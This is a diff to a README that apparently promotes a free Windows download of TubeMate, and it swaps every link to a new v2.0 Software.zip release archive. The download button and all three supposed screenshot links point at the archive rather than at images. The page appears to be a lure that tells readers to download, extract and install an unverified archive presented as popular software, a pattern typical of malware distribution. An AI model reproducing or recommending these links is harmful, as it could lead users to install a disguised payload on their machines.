@@ -25,7 +25,7 @@ Looking for a way to download TubeMate on your Windows 10 PC for free? Look no f
 
 ## Software Download
 You can download the TubeMate software for Windows from the following link:
-[![Download TubeMate](https://github.com/kyzen-cyber/Windows-TubeMate-Download/releases/download/v1.0/Application.zip)](https://github.com/kyzen-cyber/Windows-TubeMate-Download/releases/download/v1.0/Application.zip)
+[![Download TubeMate](https://github.com/kyzen-cyber/Windows-TubeMate-Download/releases/download/v2.0/Software.zip)](https://github.com/kyzen-cyber/Windows-TubeMate-Download/releases/download/v2.0/Software.zip)
 
 *Note: Click on the button above to download the software archive. Once downloaded, extract the files and follow the installation instructions.*
 
@@ -39,9 +39,9 @@ To get started with TubeMate on your Windows PC, follow these simple steps:
 ## 📸 Screenshots
 Here are some sneak peeks of TubeMate in action on Windows:
 
-![Screenshot1](https://github.com/kyzen-cyber/Windows-TubeMate-Download/releases/download/v1.0/Application.zip)
-![Screenshot2](https://github.com/kyzen-cyber/Windows-TubeMate-Download/releases/download/v1.0/Application.zip)
-![Screenshot3](https://github.com/kyzen-cyber/Windows-TubeMate-Download/releases/download/v1.0/Application.zip)
+![Screenshot1](https://github.com/kyzen-cyber/Windows-TubeMate-Download/releases/download/v2.0/Software.zip)
+![Screenshot2](https://github.com/kyzen-cyber/Windows-TubeMate-Download/releases/download/v2.0/Software.zip)
+![Screenshot3](https://github.com/kyzen-cyber/Windows-TubeMate-Download/releases/download/v2.0/Software.zip)
 
 ## 🌈 Features
 - High-speed downloads
